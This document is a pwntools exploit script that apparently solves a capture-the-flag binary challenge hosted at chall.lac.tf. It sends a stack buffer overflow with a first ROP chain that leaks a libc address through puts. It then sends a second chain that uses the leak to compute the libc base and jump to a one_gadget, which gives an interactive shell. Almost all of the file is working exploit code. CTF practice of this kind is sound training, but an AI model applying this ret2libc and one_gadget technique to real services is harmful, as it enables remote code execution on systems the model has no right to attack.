
from pwn import *

NAME = 'chall/chall'
PORT = 31137
URL = 'chall.lac.tf'
FLAGFILE = 'chall/flag.txt'


# Configuration settings for the script to launch GDB in the container
TERMINAL_CONFIG = ['tmux', 'split-window', '-h', '-F', '#{pane_pid}', '-P']

exe = ELF(NAME)
context.binary = exe
LIBC = ELF('chall/libc.so.6')
LD = ELF('chall/ld-linux-x86-64.so.2')
ENV = {"LD_PRELOAD": LIBC.path}
context.terminal = TERMINAL_CONFIG
# context.log_level = 'debug'  # Enables printing of all traffic

# readint_offset = exe.sym.read_int
# CREATE_LEVEL_RET_OFS = 0x4011b7
# GDB_COMMAND = f'''
# breakrva {CREATE_LEVEL_RET_OFS} /ctf/chall/chall
# set $readint_ofs = {readint_offset}
# continue
# '''
GDB_COMMAND = '''
break main
set $endofmain = 0x000401382
break *$endofmain
continue
'''

def create_flag(flag_path):
    write(flag_path, 'THIS_IS_THE_FLAG' * 4 + '\n')

# Create target process or connect to remote
if args['REMOTE']:
    log.warning('This challenge requires that you start the remote instance.\n'
                'Ensure that the domain and port used in this script with '
                'the remote instance')
    p = remote(URL, PORT)
elif args['GDB']:
    create_flag(FLAGFILE)
    # p = gdb.debug([LD.path, context.binary.path], gdbscript=GDB_COMMAND, env=ENV)
    p = gdb.debug(context.binary.path, gdbscript=GDB_COMMAND, env=ENV)
else:
    create_flag(FLAGFILE)
    p = process([LD.path, context.binary.path], env=ENV)


input("Enter to start")

# Get to first payload 

## Send 1 to select multiplayer
p.recvuntil(b"2. Multiplayer")
p.sendline(b"1")

## Receive "Enter World Name:"
p.recvuntil(b"Enter world name:")
# p.sendline(b"hi")

# # Build first payload

# 1. Padding (64 bytes)
padding = b'A' * 64
# 2. Rbp (need to think about how it is affected by leave, so bss (0x404e00))
rbp = p64(0x404e00)
# 2.5 nop to 16 byte align stack
nop_gadget = p64(0x4010ef)
# 3. call read_int : exe.sym.read_int (0x401176)
read_int = p64(exe.sym.read_int)
# 3.5 set up rbp 

# 4. call puts in main: 0x0401367
puts = p64(0x401243)

# dead_beef = p64(0xdeadbeef)

# 5. jump back to main to get second payload (note: jump back all the way to not deal with leave shenanigans)
main_restart = p64(0x4011BC)


payload = padding + rbp + nop_gadget + read_int + puts + main_restart

print("Payload length: ", len(payload))

# Send first payload
p.sendline(payload)

# Navigate to return
p.recvuntil(b"2. Creative")
p.sendline(b"1")

p.recvuntil(b"2. Exit")
p.sendline(b"2")


# Respond to first payload with libc leak pointer
got_puts = exe.got.puts
got_puts_str = str(got_puts)
p.sendline(got_puts_str)

# Sends a line for some reason
p.recvline()

# Receive libc leak, ending with newline
leak_bytes = p.recvline()
print("Leak bytes: ", leak_bytes)
putc_leak = int.from_bytes(leak_bytes[:-1], 'little')
print("Leaked puts address: ", hex(putc_leak))

# # Navigate to return
# p.sendline(b"2")

# Calculate libc base
libc_base = putc_leak - LIBC.sym.puts

# Build second payload
# 1. (first written, bottom of stack) Padding (64 bytes)
padding = b'A' * 64
# 2. Rbp (need to think about how it is affected by leave, so bss (0x404e00))
rbp = p64(0x404e00)
# 2.5 nop to 16 byte align stack
#nop_gadget = p64(0x4010ef)
# 3. one gadget

pop_rbp_r13_offset = 0x00fea7c
pop_rbp_r13_gadget = p64(libc_base + pop_rbp_r13_offset)

pop_rbp_value = p64(0x404e00+0x100) # Just needs to be witeable
pop_r13_value = p64(0) # NULL 

pop_rdi_offset = 0x277e5
pop_rdi_gadget = p64(libc_base + pop_rdi_offset)
pop_rdi_value = p64(0) # NULL

one_gadget_offset = 0xd511f
one_gadget = p64(libc_base + one_gadget_offset)

payload = padding + rbp + pop_rbp_r13_gadget + pop_rbp_value + \
    pop_r13_value + pop_rdi_gadget + pop_rdi_value + one_gadget
print("Payload length: ", len(payload))

# Search payload for newline, break if found
if b'\n' in payload:
    print("Payload contains newline at index: ", payload.index(b'\n'))
    print("Payload: ", payload)
    input("Press enter to try anyways...")
    # exit(1)


# Get to second payload 

# ## Send 1 to select multiplayer
# p.recvuntil(b"2. Multiplayer")
# p.sendline(b"1")

# ## Receive "Enter World Name:"
# p.recvuntil(b"Enter world name:")

# Send second payload
p.sendline(payload)

# Navigate to return
p.recvuntil(b"2. Creative")
p.sendline(b"1")

p.recvuntil(b"2. Exit")
p.sendline(b"2")

p.interactive()


# # Receive forever
# print("Receiving everything else...")
# while True:
#     try:
#         output = p.recv()
#         print(output)
#     except EOFError:
#         break
